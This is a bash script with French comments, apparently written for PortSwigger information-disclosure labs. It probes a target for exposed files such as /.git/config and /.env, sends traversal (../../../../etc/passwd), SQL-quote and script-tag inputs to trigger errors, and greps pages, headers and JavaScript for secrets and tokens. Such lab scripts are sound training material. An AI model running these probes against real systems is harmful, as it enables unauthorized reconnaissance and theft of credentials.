#!/bin/bash

# --------- Configuration à adapter ---------
TARGET_URL="https://<your-lab>.web-security-academy.net"
COOKIE="session=<your-session-cookie>"
# -------------------------------------------

print_sep() {
    echo "------------------------------------------------------"
}

# 1. Recherche de fichiers et endpoints sensibles
find_sensitive_files() {
    print_sep
    echo "[Analyse] Recherche de fichiers sensibles (robots.txt, backup, debug, versioning)"
    for path in "/robots.txt" "/.git/config" "/.svn/entries" "/.DS_Store" "/backup.zip" "/bak" "/cgi-bin/phpinfo.php" "/debug" "/debug.php" "/.env" "/.htaccess"; do
        url="$TARGET_URL$path"
        resp=$(curl -sk -b "$COOKIE" "$url")
        if [[ ! -z "$resp" && ! "$resp" =~ "Not Found" && ! "$resp" =~ "404" ]]; then
            echo "  [+] Fichier trouvé : $url"
            echo "$resp" | head -n 8
        fi
    done
}

# 2. Recherche d’informations dans le code source HTML
find_info_in_source() {
    print_sep
    echo "[Analyse] Recherche d’informations dans le code source HTML"
    html=$(curl -sk -b "$COOKIE" "$TARGET_URL")
    # Recherche de commentaires, clés, endpoints cachés
    echo "$html" | grep -iE '<!--|key|secret|debug|api|admin|token|password|endpoint' | head -n 10
}

# 3. Recherche de messages d’erreur et de verbosité
find_error_messages() {
    print_sep
    echo "[Analyse] Recherche de messages d’erreur ou de verbosité"
    for param in "id=1'" "debug=1" "test=../../../../etc/passwd" "q=<script>"; do
        url="$TARGET_URL/?$param"
        resp=$(curl -sk -b "$COOKIE" "$url")
        if echo "$resp" | grep -Ei "error|exception|warning|trace|sql|fail|stack|debug|password|secret|key" | head -1; then
            echo "  [+] Message d’erreur ou info sensible détecté pour $param"
        fi
    done
}

# 4. Recherche de headers HTTP informatifs
find_info_headers() {
    print_sep
    echo "[Analyse] Recherche de headers HTTP informatifs"
    resp=$(curl -sk -I -b "$COOKIE" "$TARGET_URL")
    echo "$resp" | grep -Ei "server:|x-powered-by:|x-debug-token|set-cookie|flag|secret"
}

# 5. Recherche de endpoints cachés dans les scripts JS
find_endpoints_in_js() {
    print_sep
    echo "[Analyse] Recherche de endpoints cachés dans les scripts JS"
    html=$(curl -sk -b "$COOKIE" "$TARGET_URL")
    jsfiles=$(echo "$html" | grep -oE 'src="[^"]+\.js"' | cut -d'"' -f2 | sort -u)
    for js in $jsfiles; do
        jsurl="$TARGET_URL$js"
        jsresp=$(curl -sk "$jsurl")
        echo "$jsresp" | grep -E "api|key|token|secret|debug|admin|endpoint" | head -n 5
    done
}

# 6. Contrôle et synthèse
print_summary() {
    print_sep
    echo "[SYNTHÈSE]"
    echo "1. Recherche de fichiers sensibles et endpoints cachés."
    echo "2. Extraction d’informations dans le code source, les erreurs, les headers et les JS."
    echo "3. Contrôle automatique : toute fuite affichée doit être validée manuellement (clé, secret, endpoint, debug, etc.)."
    echo "4. Pour les labs PortSwigger, soumettez la valeur trouvée ou exploitez l’info pour avancer dans le challenge."
    echo "- Documentation PortSwigger : https://portswigger.net/web-security/information-disclosure"
    print_sep
}

# Exécution séquentielle
echo "=== Script PortSwigger Information Disclosure : analyse, attaque et contrôle ==="
find_sensitive_files
find_info_in_source
find_error_messages
find_info_headers
find_endpoints_in_js
print_summary

# End of script
